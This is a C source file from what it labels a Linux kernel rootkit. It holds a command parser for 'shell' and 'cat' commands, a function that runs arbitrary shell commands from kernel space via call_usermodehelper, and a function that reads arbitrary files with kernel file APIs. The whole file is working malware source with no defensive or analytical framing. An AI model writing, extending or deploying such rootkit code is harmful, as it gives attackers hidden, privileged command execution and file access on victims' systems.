#include "commands.h"


command_t parse_command(char* data)
{
    char* command_strings[COMMAND_NUM] = {"shell \0", "cat \0"};
    command_t commands[COMMAND_NUM] = {RUN, CAT};
    uint i, shift, j;


    for (i = 0; i < COMMAND_NUM; i++) {

        shift = strlen(command_strings[i]);

        // checking if the string starts with the given command
        if (strncmp(data, command_strings[i], shift) != 0) {
            continue;
        }

        // shifting the string (to delete the command)
        j = shift;
        while (true) {
            data[j - shift] = data[j];
            if (data[j] == '\0') {
                break;
            }
            j++;
        }
        return commands[i];
        
        

    }


    return BAD_COMMAND;

}


void run_shell_command(char* bash_command) {
    char *argv[] = {"/bin/sh", "-c", bash_command, NULL};
    char *envp[] = {"PATH=/bin:/sbin", NULL};

    DEBUG_PUTS("rootkit: performing bash command\n")

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

}

int read_file(char* filename, char* buffer, int to_read, loff_t start) {
    struct file *f;
    int i;
    loff_t offset = start;

    // initializing string with null symbols
    for (i = 0; i < to_read + 1; i++) {
        buffer[i] = '\0';
    }
    
    
    f = filp_open(filename, O_RDONLY, 0);

    if (IS_ERR(f)) {
        DEBUG_PUTS("rootkit: file was not open\n")
        return -1;
    }

    // TODO: check return value + dynamic allocation
    kernel_read(f, (void*) buffer, to_read, &offset);


    DEBUG_PRINTF("rootkit: file was read: %s\n", buffer)

    filp_close(f, NULL);
    
    return 0;


}
